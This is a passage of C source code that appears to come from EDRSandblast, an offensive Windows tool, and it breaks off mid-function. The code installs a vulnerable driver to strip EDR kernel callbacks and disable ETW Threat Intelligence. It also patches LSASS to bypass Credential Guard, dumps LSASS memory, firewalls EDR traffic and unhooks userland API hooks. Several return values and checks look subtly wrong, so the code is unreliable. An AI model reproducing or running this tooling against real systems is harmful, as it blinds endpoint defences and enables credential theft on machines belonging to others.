#include <Windows.h>
#include <shlwapi.h>

#include "CredGuard.h"
#include "DriverOps.h"
#include "ETWThreatIntel.h"
#include "FileUtils.h"
#include "Firewalling.h"
#include "FltmgrOffsets.h"
#include "KernelCallbacks.h"
#include "KernelMemoryPrimitives.h"
#include "MinifilterCallbacks.h"
#include "PrintFunctions.h"
#include "ProcessDump.h"
#include "ProcessDumpDirectSyscalls.h"
#include "NtoskrnlOffsets.h"
#include "ObjectCallbacks.h"
#include "RunAsPPL.h"
#include "Syscalls.h"
#include "UserlandHooks.h"
#include "WdigestOffsets.h"

#include "EDRSandblast_API.h"

// A passer dans le core?
EDRSB_STATUS _InstallVulnerableDriver(EDRSB_CONTEXT* ctx) {
    EDRSB_CONFIG* config = ctx->config;

    WCHAR currentFolderPath[MAX_PATH] = { 0 };
    GetCurrentDirectoryW(_countof(currentFolderPath), currentFolderPath);

    /*
    * Setup the driver path
    */
    WCHAR driverPath[MAX_PATH] = { 0 };
    WCHAR driverDefaultName[] = DEFAULT_DRIVER_FILE;
    if (config->vulerableDriverPath == NULL) {
        WCHAR separator[] = L"\\";
        wcsncat_s(driverPath, _countof(driverPath), currentFolderPath, _countof(currentFolderPath));
        wcsncat_s(driverPath, _countof(driverPath), separator, _countof(separator));
        wcsncat_s(driverPath, _countof(driverPath), driverDefaultName, _countof(driverDefaultName));
    }
    else {
        wcscat_s(driverPath, _countof(driverPath), config->vulerableDriverPath);
    }
    if (!FileExistsW(driverPath)) {
        _tprintf_or_not(TEXT("[!] Required driver file not present at %s\n"), driverPath);
        return EDRSB_DRIVER_NOT_FOUND;
    }
    config->vulerableDriverPath = _wcsdup(driverPath);

    /*
    * Actually installs the driver
    */
    LPTSTR serviceNameIfAny = NULL;
    BOOL isDriverAlreadyRunning = IsDriverServiceRunning(config->vulerableDriverPath, &serviceNameIfAny);
    if (isDriverAlreadyRunning) {
        _putts_or_not(TEXT("[+] Vulnerable driver was already installed"));
        SetDriverServiceName(serviceNameIfAny);
    }
    else {
        _putts_or_not(TEXT("[+] Installing vulnerable driver..."));
        BOOL status = InstallVulnerableDriver(config->vulerableDriverPath);
        if (status != TRUE) {
            _putts_or_not(TEXT("[!] An error occurred while installing the vulnerable driver"));
            _putts_or_not(TEXT("[*] Uninstalling the service and attempting the install again..."));
            Sleep(20000);
            CloseDriverHandle();
            status = UninstallVulnerableDriver();
            Sleep(2000);
            status = status && InstallVulnerableDriver(config->vulerableDriverPath);
            Sleep(2000);
            if (status != TRUE) {
                _putts_or_not(TEXT("[!] New uninstall / install attempt failed, make sure that there is no trace of the driver left..."));
                return EDRSB_DRIVER_INSTALL_FAILED;
            }
        }
        Sleep(5000);// TODO : replace by a reliable method to check if the driver is ready
    }
    _putts_or_not(TEXT("\n"));
    return EDRSB_SUCCESS;
}

// A passer dans le core?
EDRSB_STATUS _LoadNtosKrnlOffsets(EDRSB_CONTEXT* ctx) {
    EDRSB_CONFIG* config = ctx->config;
    
    EDRSB_STATUS status;
    BOOL offsetsLoaded = FALSE;

    if (ctx->config->offsetRetrievalMethod.Embeded) {
        /* TODO */
    }

    if (!offsetsLoaded && ctx->config->offsetRetrievalMethod.File) {
        WCHAR ntoskrnlOffsetCSVPath[MAX_PATH] = { 0 };

        WCHAR currentFolderPath[MAX_PATH] = { 0 };
        GetCurrentDirectoryW(_countof(currentFolderPath), currentFolderPath);

        if (config->kernelOffsetFilePath == NULL) {
            WCHAR offsetCSVName[] = L"\\NtoskrnlOffsets.csv";
            wcsncat_s(ntoskrnlOffsetCSVPath, _countof(ntoskrnlOffsetCSVPath), currentFolderPath, _countof(currentFolderPath));
            wcsncat_s(ntoskrnlOffsetCSVPath, _countof(ntoskrnlOffsetCSVPath), offsetCSVName, _countof(offsetCSVName));
        }
        else {
            wcscat_s(ntoskrnlOffsetCSVPath, _countof(ntoskrnlOffsetCSVPath), config->kernelOffsetFilePath);
        }

        if (!FileExistsW(ntoskrnlOffsetCSVPath)) {
            _tprintf_or_not(TEXT("[!] Kernel offsets file not present at %s\n"), ntoskrnlOffsetCSVPath);
            config->kernelOffsetFilePath = NULL;
        }

        else {
            _putts_or_not(TEXT("[+] Loading kernel related offsets from the CSV file"));
            config->kernelOffsetFilePath = _wcsdup(ntoskrnlOffsetCSVPath);
            LoadNtoskrnlOffsetsFromFile(config->kernelOffsetFilePath);
            if (!NtoskrnlNotifyRoutinesOffsetsArePresent()) { // (only check notify routines offsets, because ETW Ti might legitimately be absent on "old" Windows versions)
                _putts_or_not(TEXT("[!] Kernel offsets are missing from the CSV for the version of ntoskrnl in use."));
            }
            else {
                _putts_or_not(TEXT("[+] Kernel offsets were loaded from the CSV file for the version of ntoskrnl in use."));
                offsetsLoaded = TRUE;
            }
        }
    }

    if (!offsetsLoaded && ctx->config->offsetRetrievalMethod.Internet) {
        _putts_or_not(TEXT("[+] Downloading kernel offsets from the MS Symbol Server (will drop a .pdb file in current directory)"));
        LoadNtoskrnlOffsetsFromInternet(FALSE);
        
        if (!NtoskrnlNotifyRoutinesOffsetsArePresent()) {
            _putts_or_not(TEXT("[-] Downloading kernel offsets from the internet failed!"));
        }
        
        else {
            _putts_or_not(TEXT("[+] Downloading kernel offsets succeeded!"));
            offsetsLoaded = TRUE;
        }
    }

    if (!offsetsLoaded) {
        _putts_or_not(TEXT("[!] The kernel offsets required couldn't be retrieve using any of the methods specified\n"));
        status = EDRSB_KERNEL_OFFSETS_NOT_FOUND;
    }
    else {
        status = EDRSB_SUCCESS;
    }

    return status;
}

// A passer dans le core?
EDRSB_STATUS _LoadWdigestOffsets(EDRSB_CONTEXT* ctx) {
    EDRSB_CONFIG* config = ctx->config;

    EDRSB_STATUS status;
    BOOL offsetsLoaded = FALSE;

    if (ctx->config->offsetRetrievalMethod.Embeded) {
        /* TODO */
    }

    if (!offsetsLoaded && ctx->config->offsetRetrievalMethod.File) {
        WCHAR wdigestOffsetCSVPath[MAX_PATH] = { 0 };

        WCHAR currentFolderPath[MAX_PATH] = { 0 };
        GetCurrentDirectoryW(_countof(currentFolderPath), currentFolderPath);

        if (config->wdigestOffsetFilePath == NULL) {
            WCHAR offsetCSVName[] = L"\\WdigestOffsets.csv";
            wcsncat_s(wdigestOffsetCSVPath, _countof(wdigestOffsetCSVPath), currentFolderPath, _countof(currentFolderPath));
            wcsncat_s(wdigestOffsetCSVPath, _countof(wdigestOffsetCSVPath), offsetCSVName, _countof(offsetCSVName));
        }
        else {
            wcscat_s(wdigestOffsetCSVPath, _countof(wdigestOffsetCSVPath), config->wdigestOffsetFilePath);
        }

        if (!FileExistsW(wdigestOffsetCSVPath)) {
            _tprintf_or_not(TEXT("[!] Wdigest offsets file not present at %s\n"), wdigestOffsetCSVPath);
            config->wdigestOffsetFilePath = NULL;
        }
        else {
            _putts_or_not(TEXT("[+] Loading wdigest related offsets from the CSV file"));
            config->wdigestOffsetFilePath = wdigestOffsetCSVPath;
            LoadWdigestOffsetsFromFile(config->wdigestOffsetFilePath);
            if (g_wdigestOffsets.st.g_fParameter_UseLogonCredential == 0x0 || g_wdigestOffsets.st.g_IsCredGuardEnabled == 0x0) {
                _putts_or_not(TEXT("[!] Offsets are missing from the CSV for the version of wdigest in use."));
            }
            else {
                _putts_or_not(TEXT("[+] Wdigest offsets were loaded from the CSV file for the version of wdigest in use."));
                offsetsLoaded = TRUE;
            }
        }
    }

    if (!offsetsLoaded && ctx->config->offsetRetrievalMethod.Internet) {
        _putts_or_not(TEXT("[+] Downloading wdigest offsets from the MS Symbol Server (will drop a .pdb file in current directory)"));
        LoadWdigestOffsetsFromInternet(FALSE);

        if (g_wdigestOffsets.st.g_fParameter_UseLogonCredential == 0x0 || g_wdigestOffsets.st.g_IsCredGuardEnabled == 0x0) {
            _putts_or_not(TEXT("[-] Downloading wdigest offsets from the internet failed!"));
        }

        else {
            _putts_or_not(TEXT("[+] Downloading wdigest offsets succeeded!"));
            offsetsLoaded = TRUE;
        }
    }

    if (!offsetsLoaded) {
        _putts_or_not(TEXT("[!] The wdigest offsets required couldn't be retrieve using any of the methods specified\n"));
        status = EDRSB_WDIGEST_OFFSETS_NOT_FOUND;
    }
    else {
        status = EDRSB_SUCCESS;
    }

    return status;
}

EDRSB_STATUS EDRSB_Init(_Out_ EDRSB_CONTEXT* ctx, _In_ EDRSB_CONFIG* config) {
    EDRSB_STATUS status;
    BOOL driverInstallRequired = FALSE;
    ctx->config = config;

    if (config->actions.ProtectProcess) {
        config->bypassMode.Krnlmode = 1;
    }

    // Check that the parameters are valid for BypassMode krnlmode.
    if (config->bypassMode.Krnlmode) {
        status = _LoadNtosKrnlOffsets(ctx);
        if (status != EDRSB_SUCCESS) {
            _tprintf_or_not(TEXT("[-] Init failed: required ntoskrnl.exe offsets for kernel operations couldn't be loaded (error 0x%lx)!\n"), status);
            return status;
        }
        BOOL success = LoadFltmgrOffsets(ctx->config->fltmgrOffsetFilePath, ctx->config->offsetRetrievalMethod.Internet);
        if (!success) {
            _tprintf_or_not(TEXT("[-] Init failed: required fltmgr.sys offsets for kernel operations couldn't be loaded (error 0x%lx)!\n"), status);
            return status;
        }

        driverInstallRequired = TRUE;
    }

    // Check that the parameters are valid for BypassMode Usermode.
    if (config->bypassMode.Usermode) {
        /* No pre-requiste yet */
    }

    if (config->actions.ProtectProcess) {
        if (g_ntoskrnlOffsets.st.eprocess_protection == 0x0) {
            _putts_or_not(TEXT("[-] Init failed: missing the _PS_PROTECTION offset, cannot set process as Protected"));
            return EDRSB_KERNEL_OFFSETS_NOT_FOUND;
        }

        driverInstallRequired = TRUE;
    }

    if (config->actions.BypassCredguard) {
        status = _LoadWdigestOffsets(ctx);
        if (status != EDRSB_SUCCESS) {
            _tprintf_or_not(TEXT("[-] Init failed: required offsets for CredentialGuard bypass couldn't be loaded (error 0x%lx)!\n"), status);
            return status;
        }
    }

    if (driverInstallRequired) {
        status = _InstallVulnerableDriver(ctx);
        if (status != EDRSB_SUCCESS) {
            _tprintf_or_not(TEXT("[-] Init failed: driver couldn't be installed (error 0x%lx)!\n"), status);
            return status;
        }

        ctx->isDriverInstalled = TRUE;
    }

    return EDRSB_SUCCESS;
}

EDRSB_STATUS Krnlmode_EnumAllMonitoring(_In_opt_ EDRSB_CONTEXT* ctx) {
    if (ctx && !ctx->config->bypassMode.Krnlmode) {
        _tprintf_or_not(TEXT("[-] Krnlmode operation failed: missing Krnlmode mode in config"));
        return EDRSB_MISSING_KRNLMODE;
    }

    EDRSB_STATUS status;

    struct FOUND_EDR_CALLBACKS* foundEDRDrivers = NULL;
    BOOL isSafeToExecutePayload = TRUE;
    BOOL foundNotifyRoutineCallbacks;
    BOOL foundObjectsCallbacks;
    BOOL foundMinifilterCallbacks;
    BOOL isETWTICurrentlyEnabled;

    BOOL verbose = ctx ? ctx->config->verbose : FALSE;

    if (ctx) {
        _putts_or_not(TEXT("[+] Checking if any EDR Kernel callbacks are configured..."));
    }

    foundEDRDrivers = (struct FOUND_EDR_CALLBACKS*)calloc(1, sizeof(struct FOUND_EDR_CALLBACKS));
    if (!foundEDRDrivers) {
        _putts_or_not(TEXT("[!] Couldn't allocate memory to enumerate the drivers in Kernel callbacks"));
        return EDRSB_MEMALLOC_FAIL;
    }

    if (ctx) {
        _putts_or_not(TEXT("[+] Check if EDR callbacks are registered on process / thread creation & image loading"));
    }
    foundNotifyRoutineCallbacks = EnumEDRNotifyRoutineCallbacks(foundEDRDrivers, verbose);
    if (ctx && foundNotifyRoutineCallbacks) {
        ctx->foundNotifyRoutineCallbacks = TRUE;
    }
    if (ctx) {
        _tprintf_or_not(TEXT("[+] Kernel notify routines have %sbeen found"), ctx->foundNotifyRoutineCallbacks ? TEXT("") : TEXT("not "));
        _putts_or_not(TEXT("[+] Check if EDR callbacks are registered on processes and threads handle creation/duplication"));
    }

    foundObjectsCallbacks = EnumEDRProcessAndThreadObjectsCallbacks(foundEDRDrivers);
    if (ctx && foundObjectsCallbacks) {
        ctx->foundObjectCallbacks = TRUE;
    }
    if (ctx) {
        _tprintf_or_not(TEXT("[+] Enabled EDR object callbacks are %s !\n"), ctx->foundObjectCallbacks ? TEXT("present") : TEXT("not found"));
        _putts_or_not(TEXT("[+] Check if EDR minifilter callbacks are registered for monitoring disk operations"));
    }

    foundMinifilterCallbacks = EnumEDRMinifilterCallbacks(foundEDRDrivers, verbose);
    if (ctx && foundMinifilterCallbacks) {
        ctx->foundMinifilterCallbacks = TRUE;
    }
    if (ctx) {
        _tprintf_or_not(TEXT("[+] EDR minifilter callbacks are %s !\n"), ctx->foundObjectCallbacks ? TEXT("present") : TEXT("not found"));
    }

    if (ctx) {
        ctx->foundEDRDrivers = foundEDRDrivers;
        _putts_or_not(TEXT("[+] Check the ETW Threat Intelligence Provider state"));
    }
    else {
        free(foundEDRDrivers);
        foundEDRDrivers = NULL;
    }

    isETWTICurrentlyEnabled = isETWThreatIntelProviderEnabled(verbose);
    if (ctx && isETWTICurrentlyEnabled) {
        ctx->isETWTICurrentlyEnabled = TRUE;
    }

    if (ctx) {
        ctx->isETWTISystemEnabled |= ctx->isETWTICurrentlyEnabled;
        _tprintf_or_not(TEXT("[+] ETW Threat Intelligence Provider is %s!\n\n"), ctx->isETWTISystemEnabled ? TEXT("ENABLED") : TEXT("DISABLED"));
        ctx->krnlmodeMonitoringEnumDone = TRUE;
    }

    if (foundNotifyRoutineCallbacks || foundObjectsCallbacks || foundMinifilterCallbacks || isETWTICurrentlyEnabled) {
        status = EDRSB_KNRL_MONITORING;
    }
    else {
        status = EDRSB_SUCCESS;
    }

    return status;
}

EDRSB_STATUS Krnlmode_RemoveAllMonitoring(_In_ EDRSB_CONTEXT* ctx) {
    if (!ctx->config->bypassMode.Krnlmode) {
        _tprintf_or_not(TEXT("[-] Krnlmode operation failed: missing Krnlmode mode in config"));
        return EDRSB_MISSING_KRNLMODE;
    }

    EDRSB_STATUS status;

    if (!ctx->krnlmodeMonitoringEnumDone) {
        status = Krnlmode_EnumAllMonitoring(ctx);
        if (status != EDRSB_KNRL_MONITORING) {
            return status;
        }
    }

    if (ctx->foundNotifyRoutineCallbacks) {
        _putts_or_not(TEXT("[+] Removing kernel callbacks registered by EDR for process creation, thread creation and image loading..."));
        // TODO Disable <-> Remove.
        RemoveEDRNotifyRoutineCallbacks(ctx->foundEDRDrivers);
    }

    if (ctx->foundObjectCallbacks) {
        _putts_or_not(TEXT("[+] Disabling kernel callbacks registered by EDR for process and thread opening or handle duplication..."));
        // TODO Disable <-> Remove.
        DisableEDRProcessAndThreadObjectsCallbacks(ctx->foundEDRDrivers);
    }

    if (ctx->foundMinifilterCallbacks) {
        _putts_or_not(TEXT("[+] Disabling minifilter callbacks registered by EDR to monitor I/O operations..."));
        RemoveEDRMinifilterCallbacks(ctx->foundEDRDrivers);
    }

    if (ctx->isETWTICurrentlyEnabled) {
        DisableETWThreatIntelProvider(ctx->config->verbose);
        ctx->isETWTICurrentlyEnabled = FALSE;
        _putts_or_not(TEXT(""));
    }

    return Krnlmode_EnumAllMonitoring(NULL);
}

EDRSB_STATUS Krnlmode_RestoreAllMonitoring(_In_ EDRSB_CONTEXT* ctx) {
    if (!ctx->krnlmodeMonitoringEnumDone) {
        _putts(TEXT("[-] Kernel mode callbacks were not enumerated prior to this call"));
        return EDRSB_FAILURE;
    }

    if (!ctx->config->actions.DontRestoreCallBacks && ctx->foundNotifyRoutineCallbacks) {
        _putts_or_not(TEXT("Restoring EDR's kernel notify routine callbacks..."));
        RestoreEDRNotifyRoutineCallbacks(ctx->foundEDRDrivers);
    }

    if (!ctx->config->actions.DontRestoreCallBacks && ctx->foundObjectCallbacks) {
        _putts_or_not(TEXT("[+] Restoring EDR's kernel object callbacks..."));
        EnableEDRProcessAndThreadObjectsCallbacks(ctx->foundEDRDrivers);
    }

    if (!ctx->config->actions.DontRestoreCallBacks && ctx->foundMinifilterCallbacks) {
        _putts_or_not(TEXT("[+] Restoring EDR's minifilter callbacks..."));
        EnableEDRProcessAndThreadObjectsCallbacks(ctx->foundEDRDrivers);
    }

    // Renable the ETW Threat Intel provider.
    if (!ctx->config->actions.DontRestoreETWTI && ctx->isETWTISystemEnabled) {
        EnableETWThreatIntelProvider(ctx->config->verbose);
    }

    if (ctx->foundEDRDrivers) {
        free(ctx->foundEDRDrivers);
        ctx->foundEDRDrivers = NULL;
    }

    ctx->krnlmodeMonitoringEnumDone = FALSE;

    return EDRSB_SUCCESS;
}

EDRSB_STATUS Action_SetCurrentProcessAsProtected(_In_ EDRSB_CONTEXT* ctx) {
    if (!ctx->config->actions.ProtectProcess) {
        _tprintf_or_not(TEXT("[-] Protecting of process failed: missing ProtectProcess action in config"));
        return EDRSB_MISSING_PROTECTPROCESS;
    }

    _putts_or_not(TEXT("[+] Self protect our current process as Light WinTcb(PsProtectedSignerWinTcb - Light)."));
    SetCurrentProcessAsProtected(ctx->config->verbose);
    return EDRSB_SUCCESS;
}

//TODO : remove, this API serves no purpose. Just expose SandMiniDumpWriteDump (with a userland bypass technique as parameter), and use GetSafeNtFunction inside SandMiniDumpWriteDump
EDRSB_STATUS Action_DumpProcessByName(_In_ EDRSB_CONTEXT* ctx, _In_ LPWSTR processName, _In_ LPWSTR outputPath, EDRSB_USERMODE_TECHNIQUE usermodeTechnique) {
    EDRSB_CONFIG* config = ctx->config;

    EDRSB_STATUS status;
    DWORD ntStatus;

    if (usermodeTechnique != -1) {
        ntStatus = SandMiniDumpWriteDump(processName, outputPath);// , usermodeTechnique);
        if (ntStatus != STATUS_SUCCES) {
            _tprintf_or_not(TEXT("[-] Process dump failed: direct syscall MiniDumpWriteDump failed with error 0x%lx!\n"), ntStatus);
            status = EDRSB_FAILURE;
        }
        else {
            status = EDRSB_SUCCESS;
        }
    }

    else {
        ntStatus = dumpProcess(processName, outputPath);
        if (!ntStatus) {
            _tprintf_or_not(TEXT("[-] Process dump failed: Lsass dump using Windows' MiniDumpWriteDump failed!"));
            status = EDRSB_FAILURE;
        }
        else {
            status = EDRSB_FAILURE;
        }
    }

    return status;
}


EDRSB_STATUS Action_FirewallBlockEDR(_In_ EDRSB_CONTEXT* ctx) {
    if (!ctx->config->actions.FirewallEDR) {
        _tprintf_or_not(TEXT("[-] Firewalling failed: missing FirewallEDR action in config"));
        return EDRSB_MISSING_FIREWALLEDR;
    }

    EDRSB_STATUS status;
    HRESULT hrStatus = S_OK;

    fwBlockingRulesList sFWEntries = { 0 };

    _tprintf_or_not(TEXT("[*] Configuring Windows Firewall rules to block EDR network access...\n\n"));

    hrStatus = FirewallBlockEDR(&sFWEntries);
    if (FAILED(hrStatus)) {
        _tprintf_or_not(TEXT("[!] An error occured while attempting to create Firewall rules!\n\n"));
        status = EDRSB_FAILURE;
    }
    else {
        _tprintf_or_not(TEXT("[+] Successfully configured Windows Firewall rules to block EDR network access!\n"));
        status = EDRSB_FAILURE;
        FirewallPrintManualDeletion(&sFWEntries);
    }

    return status;
}

EDRSB_STATUS Action_DisableCredGuard(_In_ EDRSB_CONTEXT* ctx) {
    if (!ctx->config->actions.BypassCredguard) {
        _tprintf_or_not(TEXT("[-] CredGuard bypass failed: missing BypassCredguard action in config"));
        return EDRSB_FAILURE;
    }

    EDRSB_STATUS status;
    
    if (disableCredGuardByPatchingLSASS()) {
        _putts_or_not(TEXT("[+] LSASS was patched and Credential Guard should be bypassed for future logins on the system."));
        status = EDRSB_SUCCESS;
    }
    else {
        _putts_or_not(TEXT("[!] LSASS couldn't be patched and Credential Guard will not be bypassed."));
        status = EDRSB_BYPASSCREDGUARD_FAILED;
    }

    return status;

}

VOID Usermode_EnumAllMonitoring(_Inout_ EDRSB_CONTEXT* ctx) {
    // zero-terminated HOOK array
    HOOK* hooks = searchHooks(NULL);
    ctx->foundUserlandHooks = hooks;
}

VOID Usermode_RemoveAllMonitoring(_Inout_ EDRSB_CONTEXT* ctx, EDRSB_USERMODE_TECHNIQUE technique) {
    UNHOOK_METHOD map_methods[5] = { 0 }; //maps EDRSB_USERMODE_TECHNIQUE enum with UNHOOK_METHOD enum
    map_methods[EDRSB_UMTECH_Unhook_with_ntdll_NtProtectVirtualMemory] = UNHOOK_WITH_NTPROTECTVIRTUALMEMORY;
    map_methods[EDRSB_UMTECH_Copy_ntdll_and_load] = UNHOOK_WITH_DUPLICATE_NTPROTECTVIRTUALMEMORY;
    map_methods[EDRSB_UMTECH_Allocate_trampoline] = UNHOOK_WITH_INHOUSE_NTPROTECTVIRTUALMEMORY_TRAMPOLINE;
    map_methods[EDRSB_UMTECH_Find_and_use_existing_trampoline] = UNHOOK_WITH_EDR_NTPROTECTVIRTUALMEMORY_TRAMPOLINE;
    map_methods[EDRSB_UMTECH_Use_direct_syscall] = UNHOOK_WITH_DIRECT_SYSCALL;
    UNHOOK_METHOD unhook_method = map_methods[technique];

    if (!ctx->foundUserlandHooks) {
        Usermode_EnumAllMonitoring(ctx);
    }

    HOOK* hooks = ctx->foundUserlandHooks;
    if (!hooks) {
        _putts_or_not(TEXT("[-] Failed to get userland hooks\n"));
        return;
    }

    if (hooks->disk_function != NULL) {
        _putts_or_not(TEXT("[+] Removing detected userland hooks:\n"));
    }

    for (HOOK* ptr = hooks; ptr->disk_function != NULL; ptr++) {
        printf_or_not("\tUnhooking %s using method %ld...\n", ptr->functionName, unhook_method);
        unhook(ptr, unhook_method);
    }
}

EDRSB_STATUS _Usermode_GetSafeNtFunction_with_ntdll_copy(_Inout_ EDRSB_CONTEXT* ctx, _In_z_ const WCHAR* tempDLLFilePath, _In_z_ LPCSTR ntFunctionName, _Outptr_result_maybenull_ PVOID* function);
EDRSB_STATUS _GetSafeNtFunctionUsingTrampoline(BOOL fromEdr, LPCSTR functionName, _Outptr_result_maybenull_ PVOID* function);
EDRSB_STATUS _GetSafeNtFunctionbyUnhookingWithNtProtectVirtualMemory(_In_ LPCSTR functionName, _Outptr_result_maybenull_ PVOID* function);
EDRSB_STATUS Usermode_GetSafeNtFunc(_Inout_ EDRSB_CONTEXT* ctx, _In_ LPCSTR functionName, _Outptr_result_maybenull_ PVOID* function, EDRSB_USERMODE_TECHNIQUE technique) {
    WCHAR tempDLLFilePath[MAX_PATH] = { 0 };
    switch (technique) {
    case EDRSB_UMTECH_Copy_ntdll_and_load:
        GetTempPathW(MAX_PATH, tempDLLFilePath);
        PathCombineW(tempDLLFilePath, tempDLLFilePath, L"ntdlol.txt");//TODO : make it configurable
        return _Usermode_GetSafeNtFunction_with_ntdll_copy(ctx, tempDLLFilePath, functionName, function);
    case EDRSB_UMTECH_Allocate_trampoline:
        return _GetSafeNtFunctionUsingTrampoline(FALSE, functionName, function);
    case EDRSB_UMTECH_Find_and_use_existing_trampoline:
        return _GetSafeNtFunctionUsingTrampoline(TRUE, functionName, function);
    case EDRSB_UMTECH_Unhook_with_ntdll_NtProtectVirtualMemory:
        return _GetSafeNtFunctionbyUnhookingWithNtProtectVirtualMemory(functionName, function);
    case EDRSB_UMTECH_Use_direct_syscall:
        *function = CreateSyscallStubWithVirtuallAlloc(functionName);
        if (*function) {
            return EDRSB_SUCCESS;
        }
        else {
            return EDRSB_FAILURE;
        }
    default:
        *function = NULL;
        return EDRSB_FAILURE;
    }
}

/*
* Patch the ntdll section that corresponds to the asked function, replace it with its original content, and just return a poniter to the function address in ntdll.dll
* The following actions are performed:
* - The export that immediately follows the asked function is located, and will be considered as the function boundary
* - The content of the function is copied from the on-disk version of ntdll.dll (after taking relocations into account), to the memory-mapped version
*/
EDRSB_STATUS _GetSafeNtFunctionbyUnhookingWithNtProtectVirtualMemory(_In_ LPCSTR functionName, _Outptr_result_maybenull_ PVOID* function) {
    *function = NULL;

    // Get ntdll.dll from memory and disk
    PE* ntdll_mem = NULL;
    PE* ntdll_disk = NULL;
    getNtdllPEs(&ntdll_mem, &ntdll_disk);

    // Look for the closest export from "function"
    DWORD functionRVA = PE_functionRVA(ntdll_disk, functionName);
    if (functionRVA) {
        return EDRSB_NT_FUNCTION_NOT_FOUND;
    }
    DWORD nextFunctionRVA = functionRVA - 1;
    for (DWORD i = 0; i < ntdll_disk->exportedNamesLength; i++) {
        DWORD someFunctionStartRVA = ntdll_disk->exportedFunctions[ntdll_disk->exportedOrdinals[i]];
        if (someFunctionStartRVA == functionRVA) {
            continue;
        }
        if ((someFunctionStartRVA - functionRVA) < (nextFunctionRVA - functionRVA)) {
            nextFunctionRVA = someFunctionStartRVA;
        }
    }
    
    // Check we did not cross a section boundary (last export in the section)
    IMAGE_SECTION_HEADER* textSection = PE_sectionHeader_fromRVA(ntdll_disk, functionRVA);
    DWORD textSectionEndRVA = textSection->VirtualAddress + textSection->Misc.VirtualSize;
    if (textSectionEndRVA < nextFunctionRVA) {
        nextFunctionRVA = textSectionEndRVA;
    }

    // The area to patch is between the two bounds
    PVOID functionStart = PE_RVA_to_Addr(ntdll_mem, functionRVA);
    PVOID functionEnd = PE_RVA_to_Addr(ntdll_mem, nextFunctionRVA);
    SIZE_T functionSize = (PBYTE)functionEnd - (PBYTE)functionStart;
    PVOID functionStartOnDisk = PE_RVA_to_Addr(ntdll_disk, functionRVA);

    // Use NtProtectVirtualMemory to temporarily change page permissions and patch it with disk content
    pNtProtectVirtualMemory originalNtProtectVirtualMemory = (pNtProtectVirtualMemory)PE_functionAddr(ntdll_mem, "NtProtectVirtualMemory");
    DWORD oldProtect;
    NTSTATUS status = originalNtProtectVirtualMemory(
        (HANDLE)-1, // GetCurrentProcess()
        &functionStart,
        &functionSize,
        PAGE_EXECUTE_READWRITE,
        &oldProtect
    );
    if (!NT_SUCCESS(status)) {
        return EDRSB_NTPROTECTVIRTUALMEMORY_FAILED;
    }

    for (size_t i = 0; i < functionSize; i++) {
        ((PBYTE)functionStart)[i] = ((PBYTE)functionStartOnDisk)[i];
    }

    status = originalNtProtectVirtualMemory(
        (HANDLE)-1, // GetCurrentProcess()
        &functionStart,
        &functionSize,
        oldProtect,
        &oldProtect
    );
    if (!NT_SUCCESS(status)) {
        return EDRSB_NTPROTECTVIRTUALMEMORY_FAILED;
    }

    // Return a pointer to the unhooked function
    *function = functionStart;
    return EDRSB_SUCCESS;
}

//TODO : to move in Core / deduplicate
EDRSB_STATUS _GetSafeNtFunctionUsingTrampoline(BOOL fromEdr, LPCSTR functionName, _Outptr_result_maybenull_ PVOID* function) {
    *function = NULL;

    PE* ntdllPE_mem = NULL;
    PE* ntdllPE_disk = NULL;
    getNtdllPEs(&ntdllPE_mem, &ntdllPE_disk);

    PVOID disk_NtFunction = PE_functionAddr(ntdllPE_disk, functionName);
    PVOID mem_NtFunction = PE_functionAddr(ntdllPE_mem, functionName);

    size_t patchSize = 0;
    PVOID patchAddr = findDiff(mem_NtFunction, disk_NtFunction, PATCH_MAX_SIZE, &patchSize);

    if (patchSize == 0) {
        *function = mem_NtFunction;
        return EDRSB_FUNCTION_NOT_HOOKED;
    }

    if (fromEdr) {
        PVOID trampoline = NULL;
        trampoline = searchTrampolineInExecutableMemory((PBYTE)disk_NtFunction + ((PBYTE)patchAddr - (PBYTE)mem_NtFunction), patchSize, (PBYTE)patchAddr + patchSize);
        if (NULL == trampoline) {
            printf_or_not("Trampoline for %s was impossible to find !\n", functionName);
            return EDRSB_TRAMPOLINE_NOT_FOUND;
        }
        *function = trampoline;
        return EDRSB_SUCCESS;
    }
    else {

#if _WIN64
#define JUMP_SIZE 14
#else
#define JUMP_SIZE 5
#endif
        PBYTE trampoline = VirtualAlloc(NULL, patchSize + JUMP_SIZE, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (NULL == trampoline) {
            printf_or_not("\tError : VirtualAlloc: 0x%x\n\n", GetLastError());
            return EDRSB_MEMALLOC_FAIL;
        }

        DWORD oldProtect;
        memcpy(trampoline, disk_NtFunction, patchSize);
#if _WIN64
        * ((WORD*)(trampoline + patchSize)) = 0x25FF; //RIP relative jmp
        *((DWORD*)(trampoline + patchSize + 2)) = 0x0; // [RIP + 0]
        *((QWORD*)(trampoline + patchSize + 2 + 4)) = (QWORD)(((BYTE*)mem_NtFunction) + patchSize);
#else
        * (trampoline + patchSize) = 0xE9; //far JMP
        *((DWORD*)(trampoline + patchSize + 1)) = (DWORD)(((DWORD)mem_NtFunction) + patchSize - (((DWORD)trampoline) + patchSize + JUMP_SIZE));
#endif
        VirtualProtect(trampoline, patchSize + JUMP_SIZE, PAGE_EXECUTE_READ, &oldProtect);

        *function = trampoline;
        return EDRSB_SUCCESS;
    }
}


//TODO : to move in Core / deduplicate
EDRSB_STATUS _Usermode_GetSafeNtFunction_with_ntdll_copy(_Inout_ EDRSB_CONTEXT* ctx, _In_z_ const WCHAR* tempDLLFilePath, _In_z_ LPCSTR ntFunctionName, _Outptr_result_maybenull_ PVOID* function) {
    *function = NULL;

    //BUG : cannot change/choose the DLL file path after first call
    HANDLE secondNtdll;
    if (!ctx->Cache.NtdllCopyHandle) {
        WCHAR ntdllFilePath[MAX_PATH] = { 0 };

        GetSystemDirectoryW(ntdllFilePath, _countof(ntdllFilePath));
        PathCombineW(ntdllFilePath, ntdllFilePath, L"ntdll.dll");

        CopyFileW(ntdllFilePath, tempDLLFilePath, FALSE);
        secondNtdll = LoadLibraryW(tempDLLFilePath);
        ctx->Cache.NtdllCopyHandle = secondNtdll;
    }
    secondNtdll = ctx->Cache.NtdllCopyHandle;
    PE* secondNtdll_pe = PE_create(secondNtdll, TRUE);

    PVOID functionAddress = PE_functionAddr(secondNtdll_pe, ntFunctionName);
    PE_destroy(secondNtdll_pe);
    if (functionAddress == NULL) {
        return EDRSB_NT_FUNCTION_NOT_FOUND;
    }
    else {
        *function = functionAddress;
        return EDRSB_SUCCESS;
    }
}

VOID EDRSB_CleanUp(_Inout_ EDRSB_CONTEXT* ctx) {
    if (ctx->Cache.NtdllCopyHandle) {
